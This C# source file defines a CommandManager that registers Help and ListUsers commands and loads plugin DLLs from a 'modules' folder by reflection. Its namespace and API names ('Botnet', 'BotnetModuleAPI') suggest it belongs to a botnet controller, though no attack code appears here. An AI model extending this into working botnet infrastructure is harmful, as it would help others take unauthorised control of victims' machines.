using System;
using System.Collections.Generic;
using System.Dynamic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Reflection;
using System.Text;
using Botnet.commands;
using System.Threading.Tasks;
using BotnetModuleAPI;

namespace Botnet
{
    internal class CommandManager
    {
        public static List<Command> commands = new List<Command>();

        public List<Command> getCommands()
        {
            return commands;
        }

        public void loadDLLs()
        {
            Directory.CreateDirectory(System.Environment.CurrentDirectory + "\\modules");
            string[] filePaths = Directory.GetFiles(@"" + System.Environment.CurrentDirectory + "\\modules", "*.dll");
            foreach (string STR in filePaths)
            {
                String nameOfDll = Path.GetFileName(STR).Split('.')[0];
                Assembly MyDALL = Assembly.LoadFrom(STR);
                try
                {
                    string Type = nameOfDll + ".module." + nameOfDll;
                Type[] types = MyDALL.GetTypes();
              Type MyLoadClass = MyDALL.GetType(Type.ToString());
                if (MyLoadClass != null)
                {
                    var obj = Activator.CreateInstance(MyLoadClass);
                    commands.Add((Command) obj);
                }
                else
                {
                    Console.WriteLine("Modules type = " + MyDALL);
                    Console.WriteLine("Error loading library " + nameOfDll + " : Type was null!");
                }
            }

                catch (Exception e)
                {
                    Console.WriteLine("Error loading assembly.");
                    Console.WriteLine(e);
                }
        }
    }

        public void setup()
        {
            commands.Add(new Help());
            commands.Add(new ListUsers());
            loadDLLs();
            foreach (var command in commands)
            {
                Console.WriteLine("Loaded command -- " + command.GetCatalyst());
            }
        }
    }
}